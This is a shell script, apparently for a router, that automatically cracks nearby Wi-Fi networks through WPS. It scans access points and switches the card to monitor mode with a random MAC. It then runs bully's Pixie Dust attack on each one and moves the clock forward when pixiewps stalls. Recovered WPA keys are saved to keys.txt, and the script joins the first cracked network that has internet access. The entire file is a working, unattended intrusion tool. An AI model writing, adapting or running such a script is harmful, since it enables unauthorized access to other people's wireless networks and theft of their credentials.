#!/bin/sh
. ./settings.sh
. ./wait_for.sh
WPATH=/tmp/wps_watch

select_scan_phy(){
	SCAN=$1
	BRIDGE=$2	
	if [ "$SCAN" == "auto" ];then
		SCAN=$(iw list|grep Wiphy|grep -v  phy$BRIDGE|cut -d " " -f2|sed 's/phy//g')
		if ([ "$SCAN" == "" ]&&[ "$BRIDGE" == "" ]);then
			SCAN=$(iw list|grep -m1  Wiphy|cut -d " " -f2|sed 's/phy//g')
		else
			if ([ "$SCAN" == "" ]);then
				SCAN=$(expr $BRIDGE + 1)
			else
				SCAN=1
			fi
		fi
	fi
	
	echo $SCAN
	return $SCAN
}

prepare_if(){
	EX=1;
	./wireless_cfg.sh recycle
	./wireless_cfg.sh $1 reset
	wifi	
	while [ $EX -gt 0 ];do
		IW=$(iw dev|grep "^phy#$1$" -A1|grep Interface|tr -s " "|cut -d " " -f2)
		if [ "$IW" != "" ];then
			echo Deleted IW
			iw dev $IW del
			EX=1
		else
			EX=0
		fi
	done

	PRESENT=$(iw list|grep Wiphy|grep  phy$1|wc -l)
	if [ $PRESENT -eq 0 ];then
		echo Interface phy$1 not present. Exiting
		exit	
	fi
	echo Created $2$1
	iw  phy phy$1 interface add $2$1 type managed addr $(./rnd_mac.sh)
	echo $2$1	 
}

try_internet_for_exit(){
	DELAY=300
        . ./try_internet.sh "$1" "$2" ###  "$PHYN" "$KLINE"

        if [ $HAVEINET -gt 0 ];then
                sleep 1
                wifi
                sleep 10
		./query_date.sh inet
                ./services.sh for_internet
		./post_internet.sh phy$PHYN
                echo "Connected :)"
                echo "Waiting $DELAY secs for stability check"
                sleep $DELAY
                HAVEINET=$(./have_internet.sh)
                if [ $HAVEINET -gt 0 ];then
                         echo "Ok, conn is stable, updating ddns"
			 ./ddns.sh force
			 echo "$1" "$2" >/tmp/trusted_wan_params 
                         echo Exiting
                         exit
                fi
        fi

}

echo '############## WATCH-WPS @TaiksonTexas ########################'
rm /tmp/trusted_wan_params 2>/dev/null
PHYN=$(select_scan_phy $PHY_INDEX_WPS  $PHY_INDEX_BRIDGE)
echo Interface phy$PHYN

killall wpa_supplicant 2>/dev/null
./set_my_bridge.sh
sleep 15
./query_date.sh local

./services.sh for_scan 2>/dev/null
sleep 1
prepare_if $PHYN wlan
sleep 5
prepare_if $PHYN wlan
sleep 1
./services.sh for_scan 2>/dev/null
echo Configured in wlan$PHYN
sleep 1
echo Scanning APs...
IF=wlan$PHYN
APS=$(. ./survey.sh $IF|grep -v "####"|sort -nr)
echo Setting monitor
. ./set_mode.sh $IF monitor

mkdir $WPATH 2>/dev/null

ROUNDS="0 1 2"

for ROUND in $ROUNDS;do
echo Begin round
for LINE in $APS;do
	AP=$(echo $LINE|cut -d "#" -f2)
	CHN=$(echo $LINE|cut -d "#" -f3)
	ENC=$(echo $LINE|cut -d "#" -f4)
	ESSID=$(echo $LINE|cut -d "#" -f5)


	if ([ $ROUND -eq 0 ]&&[ $(cat keys.txt|grep -i "$AP"|wc -l) -eq 0 ]);then
		echo Round $ROUND , AP $AP Not present in keys.txt, skipping
		continue	
		
	fi


	ALINE=$AP"~"$ENC"~"
	echo "Current Line " $ALINE 
	KPLINE=$(cat keys.txt|grep -i "$ALINE"|tail -n1)
	echo $KPLINE
	if [ "$KPLINE" != "" ];then
		echo Network found in database, trying...
		try_internet_for_exit "$PHYN" "$KPLINE"
	fi	

		./services.sh for_scan 2>/dev/null
		if [ $(iwinfo $IF info|grep Mode:|grep Monitor:|wc -l) -eq 0 ];then
			echo $IF lost monitor config. Resetting AGAAAAAAAAAAAAAAIN.
			PHYN=$(select_scan_phy $PHY_INDEX_WPS  $PHY_INDEX_BRIDGE)
			IF=wlan$PHYN
			echo Detected phy$PHYN
			prepare_if $PHYN wlan
			PHYN=$(select_scan_phy $PHY_INDEX_WPS $PHY_INDEX_BRIDGE)
			IF=wlan$PHYN
			sleep 5                                                
                        ./set_mode.sh $IF monitor 
		fi
		rm /tmp/wps_watch/* 2>/dev/null
		sleep 2
		PIXIE_RETRY=0
		ORIG_DATE=$(date +%s)
		while [ $PIXIE_RETRY -lt $PIXIE_ATTEMPS ];do	
			echo CALL:: "bully -w $WPATH -c $CHN -b $AP -l 200 -d -1 1,1 -D $IF"

			bully -w $WPATH -v4 -c $CHN -b $AP -l 200 -d -1 1,1 -D $IF 2> /tmp/bully_out &
			wait_for bully $WAIT_BULLY 

			sleep 1
			PIXIE=$(ps -w|grep pixiewps|grep -v grep|tr -d " "|wc -l)
			./services.sh for_scan 2>/dev/null
			touch /tmp/check_conn_log
			touch /tmp/forced_ntpd_result
			if ([ $PIXIE -gt 0 ]&&[ $(cat /tmp/check_conn_log|sed 's/#//g'|sed 's/\.//g'|wc -c) -lt 4 ]&&[ "$(cat /tmp/forced_ntpd_result)" != "0" ]);then
				echo Pixiewps stalled. Setting date to the future
				CDATE=$(date +%s)
				NDATE=$(expr $CDATE + $PIXIE_DATE_STEP)
				date -s @$NDATE
				echo Now date is set to $(date)
				PIXIE_RETRY=$(expr $PIXIE_RETRY + 1)
				echo Retrying attack. Attemp: $PIXIE_RETRY / $PIXIE_ATTEMPS
			else
				PIXIE_RETRY=$PIXIE_ATTEMPS
			fi
		done
		echo Back to original date
                date -s @$ORIG_DATE
		sleep 1

		

		ISKEY=$(cat /tmp/bully_out|tr -d " "|grep 'KEY:'|wc -l)
		if ([ $ISKEY -le 0 ]&&[ $ROUND -eq 2 ]);then
			echo "****Calling bully without pixie Round $ROUND"
			bully -w $WPATH -v4 -c $CHN -b $AP -l 200 -1 1,1 -D $IF 2> /tmp/bully_out &			
			wait_for bully $WAIT_BULLY_NO_PIXIE
		fi

		ISKEY=$(cat /tmp/bully_out|tr -d " "|grep 'KEY:'|wc -l)

		if [ $ISKEY -gt 0 ];then
			KEY=$(cat /tmp/bully_out |grep KEY|cut -d "'" -f2)
			BSSID=$(cat /tmp/bully_out |grep BSSID|cut -d "'" -f2)
			ESSID=$(cat /tmp/bully_out |grep ESSID|cut -d "'" -f2)
			echo ------------------------ KEY FOUND! $BSSID $KEY----------
			KLINE=$BSSID"~"$ENC"~"$ESSID"~"$KEY		
			if [ $(cat keys.txt|grep $KLINE|wc -l) -eq 0 ];then
				#cat keys.txt|grep -v $BSSID":" >/tmp/nkeys.txt
				
				echo $BSSID"~"$ENC"~"$ESSID"~"$KEY >>keys.txt
				#cat /tmp/nkeys.txt >> keys.txt
			fi

			try_internet_for_exit "$PHYN" "$KLINE"
			
				echo "************NO inet found; next network"
				./services.sh for_scan 2>/dev/null
				PHYN=$(select_scan_phy $PHY_INDEX_WPS  $PHY_INDEX_BRIDGE)
				
				prepare_if $PHYN wlan
				./services.sh for_scan 2>/dev/null
				sleep 5
				. ./set_mode.sh $IF monitor
				sleep 1
		

		fi

done
echo "Exited. No more APs"


./set_my_bridge.sh
sleep 60
done


